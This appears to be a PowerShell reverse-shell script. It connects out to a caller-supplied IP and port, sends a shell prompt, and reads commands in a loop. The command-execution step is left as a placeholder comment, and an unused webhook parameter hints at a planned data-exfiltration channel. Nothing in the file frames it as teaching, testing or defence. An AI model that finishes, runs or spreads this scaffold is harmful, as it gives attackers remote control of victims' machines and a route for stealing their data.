param (
    [string]$webhook,
    [string]$ip,
    [int]$port
)

# Create TCP client connection and streams
$client = New-Object Net.Sockets.TCPClient
$client.Connect($ip, $port)

if (-not $client.Connected) {
    Write-Error "Could not connect to $ip:$port"
    exit
}

$stream = $client.GetStream()
if ($null -eq $stream) {
    Write-Error "Could not get network stream."
    $client.Close()
    exit
}

$writer = New-Object IO.StreamWriter($stream)
if ($null -eq $writer) {
    Write-Error "Could not create stream writer."
    $stream.Close()
    $client.Close()
    exit
}

function SendToStream($msg) {
    if ($null -ne $writer) {
        $writer.Write($msg + 'ffff> ')
        $writer.Flush()
    }
}

SendToStream "Connected to $ip on port $port"

$buffer = New-Object byte[] 4096

while ($true) {
    try {
        if ($null -eq $stream) { break }

        $read = $stream.Read($buffer, 0, $buffer.Length)

        # If no bytes read, remote closed connection
        if ($read -le 0) {
            break
        }

        $inputStr = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $read)

        # Process $inputStr as before (commands, etc.)
        # Example:
        SendToStream "Received: $inputStr"
        
        # Your command handling logic here...
        # ...
        
    }
    catch {
        Write-Error "Exception during stream read: $_"
        break
    }
}

# Cleanup
if ($writer) { $writer.Close() }
if ($stream) { $stream.Close() }
if ($client) { $client.Close() }
